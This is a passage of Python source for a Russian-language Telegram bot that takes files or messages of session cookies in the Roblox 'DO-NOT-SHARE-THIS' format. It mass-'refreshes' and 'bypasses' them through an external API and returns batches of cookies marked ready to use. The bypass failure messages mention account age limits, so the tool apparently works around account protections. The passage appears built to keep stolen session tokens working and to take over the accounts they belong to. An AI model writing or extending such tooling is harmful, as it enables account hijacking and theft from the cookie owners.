        )

@router.message(F.text == "Cookie Refresh")
async def refresh_menu(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Рефреш файла", callback_data="refresh_file")],
        [InlineKeyboardButton(text="📝 Рефреш сообщения", callback_data="refresh_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_refresh_menu")]
    ])
    
    await message.answer(
        f"🔄 <b>МЕНЮ РЕФРЕША КУКОВ</b>\n"
        f"\n"
        
        f"📤 <b>Выберите способ рефреша:</b>\n"
        f"├ Файл (.txt) с куками\n"
        f"└ Сообщение с куками\n\n"
        
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Используется внешний API\n"
        f"├ Время обработки зависит от количества\n"
        f"└ Результат → файл с обновленными куками\n\n"
        
        f"<i>Выберите способ рефреша</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "refresh_file")
async def refresh_file_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_refresh_menu")]
    ])
    
    await callback.message.answer(
        f"🔄 <b>ИНСТРУКЦИЯ РЕФРЕША ФАЙЛА</b>\n"
        f"\n"
        
        f"1. <b>Подготовьте файл с куками (.txt)</b>\n"
        f"2. <b>Отправьте файл в этот чат</b>\n\n"
        
        f"📁 <b>Требования к файлу:</b>\n"
        f"├ Формат: ТОЛЬКО TXT\n"
        f"├ Макс. размер: 20MB\n"
        f"└ Каждая печенька → новая строка\n\n"
        
        f"<i>«Жду ваш файл :3»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.refresh_file)

@router.callback_query(F.data == "refresh_message")
async def refresh_message_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_refresh_menu")]
    ])
    
    await callback.message.answer(
        f"🔄 <b>ИНСТРУКЦИЯ РЕФРЕША СООБЩЕНИЯ</b>\n"
        f"\n"
        
        f"1. <b>Введите печеньку в чат</b>\n"
        f"2. <b>Или отправьте несколько куки, каждую с новой строки</b>\n\n"
        
        f"📋 <b>Формат:</b>\n"
        f"├ Одна печенька → одно сообщение\n"
        f"└ Несколько куки → каждую с новой строки\n\n"
        
        f"<i>«Отправьте печеньку для рефреша»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.refresh_cookie)

@router.message(Form.refresh_cookie)
async def process_refresh_cookie_message(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    text = message.text.strip()
    if not text:
        await message.answer("❌ <b>Сообщение пустое.</b>\nОтправьте печеньку для рефреша.", parse_mode=ParseMode.HTML)
        return
    
    msg = await message.answer("🔄 <b>Начинаю рефреш печеньки...</b>", parse_mode=ParseMode.HTML)
    
    try:
        cookies = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    cookies.append(full_cookie)
                except:
                    pass
        
        if not cookies:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>РЕФРЕШ СООБЩЕНИЯ</b>\n"
                f"\n"
                f"🚫 <b>В сообщении не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        await msg.edit_text(
            f"🔄 <b>НАЧАТ РЕФРЕШ куки</b>\n"
            f"\n"
            f"📊 <b>Статистика:</b>\n"
            f"├ Всего строк: <code>{len(lines):,}</code>\n"
            f"├ Валидных кук: <code>{len(cookies):,}</code>\n"
            f"└ Невалидных строк: <code>{len(lines) - len(cookies)}</code>\n\n"
            f"⏳ <b>Начинаю рефреш...</b>\n\n"
            f"<i>Это может занять несколько минут в зависимости от количества кук.</i>",
            parse_mode=ParseMode.HTML
        )
        
        result = await mass_refresh_cookies(cookies)
        
        if result['success'] > 0:
            
            refreshed_file_path = f"{COOKIE_FILES_DIR}refreshed_cookies.txt"
            with open(refreshed_file_path, 'w', encoding='utf-8') as f:
                for cookie in result['refreshed']:
                    f.write(cookie + '\n')
            
            await bot.send_sticker(message.chat.id, STICKERS['success'])
            
            result_text = (
                f"✅ <b>РЕФРЕШ КУКОВ ЗАВЕРШЕН</b>\n"
                f"\n"
                f"📊 <b>Результаты:</b>\n"
                f"├ Всего кук: <code>{result['total']:,}</code>\n"
                f"├ Успешно обновлено: <code>{result['success']:,}</code>\n"
                f"├ Не удалось обновить: <code>{result['failed_count']:,}</code>\n"
                f"└ Процент успеха: <code>{round(result['success']/result['total']*100, 2)}%</code>\n\n"
            )
            
            if result['failed']:
                failed_file_path = f"{COOKIE_FILES_DIR}failed_refresh.txt"
                with open(failed_file_path, 'w', encoding='utf-8') as f:
                    for failed_item in result['failed']:
                        f.write(f"Cookie: {failed_item['cookie'][:50]}...\n")
                        f.write(f"Error: {failed_item['error']}\n")
                        f.write("-" * 50 + "\n")
                
                result_text += f"└ Ошибки рефреша — во втором файле\n\n"
            
            result_text += f"<i>Обновленные куки готовы к использованию!</i>"
            
            await message.answer_document(
                document=FSInputFile(refreshed_file_path),
                caption=result_text,
                parse_mode=ParseMode.HTML
            )
            
            if result['failed'] and os.path.exists(failed_file_path):
                await message.answer_document(
                    document=FSInputFile(failed_file_path),
                    caption="📝 <b>Ошибки при рефреше:</b>\n══════════════════════════",
                    parse_mode=ParseMode.HTML
                )
                os.remove(failed_file_path)
            
            os.remove(refreshed_file_path)
                        
        else:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>РЕФРЕШ НЕ УДАЛСЯ</b>\n"
                f"\n"
                f"🚫 <b>Не удалось обновить ни одну куку.</b>\n\n"
                f"📝 <b>Возможные причины:</b>\n"
                f"├ API временно недоступен\n"
                f"├ Все куки имеют неверный формат\n"
                f"├ Проблемы с интернет-соединением\n"
                f"└ Ограничения внешнего сервиса\n\n"
                f"<i>Попробуйте позже или используйте другие куки.</i>",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ РЕФРЕША</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат печеньки\n"
            f"2. Убедитесь, что это валидная печенька\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки рефреша сообщения: {e}")
    finally:
        await state.clear()

@router.message(Form.refresh_file)
async def process_refresh_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("❌ <b>Пожалуйста, отправьте файл с печеньками.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer("❌ <b>Неверный формат файла.</b>\nОтправьте текстовый файл (.txt).", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"refresh_{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("📥 <b>Скачиваю файл...</b>\n<i>Это может занять время для больших файлов.</i>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ПРОВЕРКА ФАЙЛА</b>\n"
                f"\n"
                f"🚫 <b>В файле не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат файла и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        await msg.edit_text(
            f"🔄 <b>НАЧАТ РЕФРЕШ КУКОВ</b>\n"
            f"\n"
            f"📊 <b>Статистика файла:</b>\n"
            f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
            f"├ Валидных кук: <code>{len(file_info['cookies']):,}</code>\n"
            f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
            f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
            f"⏳ <b>Начинаю рефреш...</b>\n\n"
            f"<i>Это может занять несколько минут в зависимости от количества кук.</i>",
            parse_mode=ParseMode.HTML
        )
        
        result = await mass_refresh_cookies(file_info['cookies'])
        
        if result['success'] > 0:
            
            refreshed_file_path = f"{COOKIE_FILES_DIR}refreshed_cookies.txt"
            with open(refreshed_file_path, 'w', encoding='utf-8') as f:
                for cookie in result['refreshed']:
                    f.write(cookie + '\n')
            
            await bot.send_sticker(message.chat.id, STICKERS['success'])
            
            result_text = (
                f"✅ <b>РЕФРЕШ КУКОВ ЗАВЕРШЕН</b>\n"
                f"\n"
                f"📊 <b>Результаты:</b>\n"
                f"├ Всего кук: <code>{result['total']:,}</code>\n"
                f"├ Успешно обновлено: <code>{result['success']:,}</code>\n"
                f"├ Не удалось обновить: <code>{result['failed_count']:,}</code>\n"
                f"└ Процент успеха: <code>{round(result['success']/result['total']*100, 2)}%</code>\n\n"
            )
            
            if result['failed']:
                failed_file_path = f"{COOKIE_FILES_DIR}failed_refresh.txt"
                with open(failed_file_path, 'w', encoding='utf-8') as f:
                    for failed_item in result['failed']:
                        f.write(f"Cookie: {failed_item['cookie'][:50]}...\n")
                        f.write(f"Error: {failed_item['error']}\n")
                        f.write("-" * 50 + "\n")
                
                result_text += f"└ Ошибки рефреша — во втором файле\n\n"
            
            result_text += f"<i>Обновленные куки готовы к использованию!</i>"
            
            await message.answer_document(
                document=FSInputFile(refreshed_file_path),
                caption=result_text,
                parse_mode=ParseMode.HTML
            )
            
            if result['failed'] and os.path.exists(failed_file_path):
                await message.answer_document(
                    document=FSInputFile(failed_file_path),
                    caption="📝 <b>Ошибки при рефреше:</b>\n══════════════════════════",
                    parse_mode=ParseMode.HTML
                )
                os.remove(failed_file_path)
            
            os.remove(refreshed_file_path)
            
        else:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>РЕФРЕШ НЕ УДАЛСЯ</b>\n"
                f"\n"
                f"🚫 <b>Не удалось обновить ни одну куку.</b>\n\n"
                f"📝 <b>Возможные причины:</b>\n"
                f"├ API временно недоступен\n"
                f"├ Все куки имеют неверный формат\n"
                f"├ Проблемы с интернет-соединением\n"
                f"└ Ограничения внешнего сервиса\n\n"
                f"<i>Попробуйте позже или используйте другие куки.</i>",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ РЕФРЕША</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат файла\n"
            f"2. Убедитесь, что это .txt файл\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки рефреша: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        await state.clear()

@router.message(F.text == "Cookie Bypass")
async def bypass_menu(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Байпас файла", callback_data="bypass_file")],
        [InlineKeyboardButton(text="📝 Байпас сообщения", callback_data="bypass_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_bypass_menu")]
    ])
    
    await message.answer(
        f"🔓 <b>МЕНЮ БАЙПАСА КУКОВ</b>\n"
        f"\n"
        
        f"📤 <b>Способы байпаса:</b>\n"
        f"├ 📁 Файл (.txt) с куками\n"
        f"└ 📝 Сообщение с куками\n\n"
        
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Используется внешний API\n"
        f"├ Время обработки зависит от количества\n"
        f"└ Результат → файл с обновленными куками\n\n"
        
        f"<i>Выберите способ байпаса</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "bypass_file")
async def bypass_file_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_bypass_menu")]
    ])
    
    await callback.message.answer(
        f"🔓 <b>НАЧАЛО БАЙПАСА ФАЙЛА</b>\n"
        f"\n"
        
        f"1. <b>Подготовьте файл с куками (.txt)</b>\n"
        f"2. <b>Отправьте файл в этот чат</b>\n\n"
        
        f"📁 <b>Требования к файлу:</b>\n"
        f"├ Только текстовый формат (.txt)\n"
        f"├ Максимальный размер: 20MB\n"
        f"└ Каждая кука на новой строке\n\n"
        
        f"<i>«Жду ваш файл :3»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.bypass_file)

@router.callback_query(F.data == "bypass_message")
async def bypass_message_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_bypass_menu")]
    ])
    
    await callback.message.answer(
        f"🔓 <b>НАЧАЛО БАЙПАСА СООБЩЕНИЯ</b>\n"
        f"\n"
        
        f"1. <b>Введите печеньку в чат</b>\n"
        f"2. <b>Или отправьте несколько куки, каждую с новой строки</b>\n\n"
        
        f"📋 <b>Формат:</b>\n"
        f"├ Одна печенька → одно сообщение\n"
        f"└ Несколько куки → каждую с новой строки\n\n"
        
        f"<i>«Отправьте печеньку для байпаса»</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.bypass_cookie)

@router.message(Form.bypass_cookie)
async def process_bypass_cookie_message(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    text = message.text.strip()
    if not text:
        await message.answer("❌ <b>Сообщение пустое.</b>\nОтправьте печеньку для байпаса.", parse_mode=ParseMode.HTML)
        return
    
    msg = await message.answer("🔓 <b>Начинаю байпас печеньки...</b>", parse_mode=ParseMode.HTML)
    
    try:
        cookies = []
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if '_|WARNING:-DO-NOT-SHARE-THIS.' in line:
                try:
                    cookie = line.split('_|WARNING:-DO-NOT-SHARE-THIS.')[1].split()[0]
                    full_cookie = f'_|WARNING:-DO-NOT-SHARE-THIS.{cookie}'
                    cookies.append(full_cookie)
                except:
                    pass
        
        if not cookies:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>БАЙПАС СООБЩЕНИЯ</b>\n"
                f"\n"
                f"🚫 <b>В сообщении не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        await msg.edit_text(
            f"🔓 <b>НАЧАТ БАЙПАС куки</b>\n"
            f"\n"
            f"📊 <b>Статистика:</b>\n"
            f"├ Всего строк: <code>{len(lines):,}</code>\n"
            f"├ Валидных кук: <code>{len(cookies):,}</code>\n"
            f"└ Невалидных строк: <code>{len(lines) - len(cookies)}</code>\n\n"
            f"⏳ <b>Начинаю байпас...</b>\n\n"
            f"<i>Это может занять несколько минут в зависимости от количества кук.</i>",
            parse_mode=ParseMode.HTML
        )
        
        result = await mass_bypass_cookies(cookies)
        
        if result['success'] > 0:
            
            bypassed_file_path = f"{COOKIE_FILES_DIR}bypassed_cookies.txt"
            with open(bypassed_file_path, 'w', encoding='utf-8') as f:
                for cookie in result['bypassed']:
                    f.write(cookie + '\n')
            
            await bot.send_sticker(message.chat.id, STICKERS['success'])
            
            result_text = (
                f"✅ <b>БАЙПАС КУКОВ ЗАВЕРШЕН</b>\n"
                f"\n"
                f"📊 <b>Результаты:</b>\n"
                f"├ Всего кук: <code>{result['total']:,}</code>\n"
                f"├ Успешно обработано: <code>{result['success']:,}</code>\n"
                f"├ Не удалось обработать: <code>{result['failed_count']:,}</code>\n"
                f"└ Процент успеха: <code>{round(result['success']/result['total']*100, 2)}%</code>\n\n"
                
                f"📁 <b>Файлы:</b>\n"
                f"├ Обработанные куки — в прикрепленном файле\n"
            )
            
            if result['failed']:
                failed_file_path = f"{COOKIE_FILES_DIR}failed_bypass.txt"
                with open(failed_file_path, 'w', encoding='utf-8') as f:
                    for failed_item in result['failed']:
                        f.write(f"Cookie: {failed_item['cookie'][:50]}...\n")
                        f.write(f"Error: {failed_item['error']}\n")
                        f.write("-" * 50 + "\n")
                
                result_text += f"└ Ошибки байпаса — во втором файле\n\n"
            
            result_text += f"<i>Обработанные куки готовы к использованию!</i>"
            
            await message.answer_document(
                document=FSInputFile(bypassed_file_path),
                caption=result_text,
                parse_mode=ParseMode.HTML
            )
            
            if result['failed'] and os.path.exists(failed_file_path):
                await message.answer_document(
                    document=FSInputFile(failed_file_path),
                    caption="📝 <b>Ошибки при байпасе:</b>\n══════════════════════════",
                    parse_mode=ParseMode.HTML
                )
                os.remove(failed_file_path)
            
            os.remove(bypassed_file_path)
            
                        
        else:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>БАЙПАС НЕ УДАЛСЯ</b>\n"
                f"\n"
                f"🚫 <b>Не удалось обработать ни одну куку.</b>\n\n"
                f"📝 <b>Возможные причины:</b>\n"
                f"├ Возраст кука 18+\n"
                f"├ Все куки имеют неверный формат\n"
                f"├ Возраст кука verified <13\n"
                f"└ Байпас уже был сделан\n\n"
                f"<i>Попробуйте позже или используйте другие куки.</i>",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ БАЙПАСА</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат печеньки\n"
            f"2. Убедитесь, что это валидная печенька\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки байпаса сообщения: {e}")
    finally:
        await state.clear()

@router.message(Form.bypass_file)
async def process_bypass_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(message.chat.id, STICKERS['ban'])
        await message.answer(f"🚫 <b>Вы заблокированы.</b>\nПричина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("❌ <b>Пожалуйста, отправьте файл с печеньками.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await message.answer("❌ <b>Неверный формат файла.</b>\nОтправьте текстовый файл (.txt).", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"bypass_{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("📥 <b>Скачиваю файл...</b>\n<i>Это может занять время для больших файлов.</i>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>ПРОВЕРКА ФАЙЛА</b>\n"
                f"\n"
                f"🚫 <b>В файле не найдено валидных куки.</b>\n\n"
                f"<i>Проверьте формат файла и попробуйте снова.</i>",
                parse_mode=ParseMode.HTML
            )
            return
        
        await msg.edit_text(
            f"🔓 <b>НАЧАТ БАЙПАС КУКОВ</b>\n"
            f"\n"
            f"📊 <b>Статистика файла:</b>\n"
            f"├ Всего строк: <code>{file_info['total_lines']:,}</code>\n"
            f"├ Валидных кук: <code>{len(file_info['cookies']):,}</code>\n"
            f"├ Дубликатов: <code>{file_info['duplicates']}</code>\n"
            f"└ Невалидных строк: <code>{file_info['invalid_lines']}</code>\n\n"
            f"⏳ <b>Начинаю байпас...</b>\n\n"
            f"<i>Это может занять несколько минут в зависимости от количества кук.</i>",
            parse_mode=ParseMode.HTML
        )
        
        result = await mass_bypass_cookies(file_info['cookies'])
        
        if result['success'] > 0:
            
            bypassed_file_path = f"{COOKIE_FILES_DIR}bypassed_cookies.txt"
            with open(bypassed_file_path, 'w', encoding='utf-8') as f:
                for cookie in result['bypassed']:
                    f.write(cookie + '\n')
            
            await bot.send_sticker(message.chat.id, STICKERS['success'])
            
            result_text = (
                f"✅ <b>БАЙПАС КУКОВ ЗАВЕРШЕН</b>\n"
                f"\n"
                f"📊 <b>Результаты:</b>\n"
                f"├ Всего кук: <code>{result['total']:,}</code>\n"
                f"├ Успешно обработано: <code>{result['success']:,}</code>\n"
                f"├ Не удалось обработать: <code>{result['failed_count']:,}</code>\n"
                f"└ Процент успеха: <code>{round(result['success']/result['total']*100, 2)}%</code>\n\n"
                
                f"📁 <b>Файлы:</b>\n"
                f"├ Обработанные куки — в прикрепленном файле\n"
            )
            
            if result['failed']:
                failed_file_path = f"{COOKIE_FILES_DIR}failed_bypass.txt"
                with open(failed_file_path, 'w', encoding='utf-8') as f:
                    for failed_item in result['failed']:
                        f.write(f"Cookie: {failed_item['cookie'][:50]}...\n")
                        f.write(f"Error: {failed_item['error']}\n")
                        f.write("-" * 50 + "\n")
                
                result_text += f"└ Ошибки байпаса — во втором файле\n\n"
            
            result_text += f"<i>Обработанные куки готовы к использованию!</i>"
            
            await message.answer_document(
                document=FSInputFile(bypassed_file_path),
                caption=result_text,
                parse_mode=ParseMode.HTML
            )
            
            if result['failed'] and os.path.exists(failed_file_path):
                await message.answer_document(
                    document=FSInputFile(failed_file_path),
                    caption="📝 <b>Ошибки при байпасе:</b>\n══════════════════════════",
                    parse_mode=ParseMode.HTML
                )
                os.remove(failed_file_path)
            
            os.remove(bypassed_file_path)
        else:
            await bot.send_sticker(message.chat.id, STICKERS['error'])
            await msg.edit_text(
                f"❌ <b>БАЙПАС НЕ УДАЛСЯ</b>\n"
                f"\n"
                f"🚫 <b>Не удалось обработать ни одну куку.</b>\n\n"
                f"📝 <b>Возможные причины:</b>\n"
                f"├ Возраст кука 18+\n"
                f"├ Все куки имеют неверный формат\n"
                f"├ Возраст кука verified <13\n"
                f"└ Байпас уже был сделан\n\n"
                f"<i>Попробуйте позже или используйте другие куки.</i>",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        await bot.send_sticker(message.chat.id, STICKERS['error'])
        error_message = (
            f"❌ <b>ОШИБКА ОБРАБОТКИ БАЙПАСА</b>\n"
            f"\n"
            f"📝 <b>Произошла ошибка:</b>\n"
            f"<code>{str(e)}</code>\n\n"
            f"🔄 <b>Решение:</b>\n"
            f"1. Проверьте формат файла\n"
            f"2. Убедитесь, что это .txt файл\n"
            f"3. Попробуйте еще раз\n\n"
            f"<i>Если ошибка повторяется, обратитесь в поддержку.</i>"
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки байпаса: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)
        await state.clear()

@router.callback_query(F.data == "back_to_refresh_menu")
async def back_to_refresh_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Рефреш файла", callback_data="refresh_file")],
        [InlineKeyboardButton(text="📝 Рефреш сообщения", callback_data="refresh_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.edit_text(
        f"🔄 <b>МЕНЮ РЕФРЕША КУКОВ</b>\n"
        f"\n"
        
        f"📤 <b>Выберите способ рефреша:</b>\n"
        f"├ Файл (.txt) с куками\n"
        f"└ Сообщение с куками\n\n"
        
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Используется внешний API\n"
        f"├ Время обработки зависит от количества\n"
        f"└ Результат → файл с обновленными куками\n\n"
        
        f"<i>Выберите способ рефреша</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "back_to_bypass_menu")
async def back_to_bypass_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Байпас файла", callback_data="bypass_file")],
        [InlineKeyboardButton(text="📝 Байпас сообщения", callback_data="bypass_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu")]
    ])
    
    await callback.message.edit_text(
        f"🔓 <b>МЕНЮ БАЙПАСА КУКОВ</b>\n"
        f"\n"
        
        f"📤 <b>Способы байпаса:</b>\n"
        f"├ 📁 Файл (.txt) с куками\n"
        f"└ 📝 Сообщение с куками\n\n"
        
        f"⚠️ <b>Внимание:</b>\n"
        f"├ Используется внешний API\n"
        f"├ Время обработки зависит от количества\n"
        f"└ Результат → файл с обновленными куками\n\n"
        
        f"<i>Выберите способ байпаса</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.message(F.text == "Cookie Splitter")
async def cookie_splitter_handler(message: Message, state: FSMContext):
    """Обработчик для разделения кук"""
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📁 Разделить из файла", callback_data="split_file")],
        [InlineKeyboardButton(text="📝 Разделить из сообщения", callback_data="split_message")],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ])
    
    await message.answer(
        f"✂️ <b>РАЗДЕЛИТЕЛЬ КУКОВ</b>\n"
        f"\n"
        
        f"📊 <b>Описание:</b>\n"
        f"Разделяет куки построчно и сохраняет каждое кукт в отдельный файл\n\n"
        
        f"📤 <b>Способы ввода:</b>\n"
        f"├ 📁 Файл (.txt) с куками (по одной на строку)\n"
        f"└ 📝 Сообщение с куками (по одной на строку)\n\n"
        
        f"✨ <b>Результат:</b>\n"
        f"Получите архив с отдельными файлами для каждой куки\n\n"
        
        f"<i>Выберите способ разделения</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "split_file")
async def split_file_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"🚫 Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
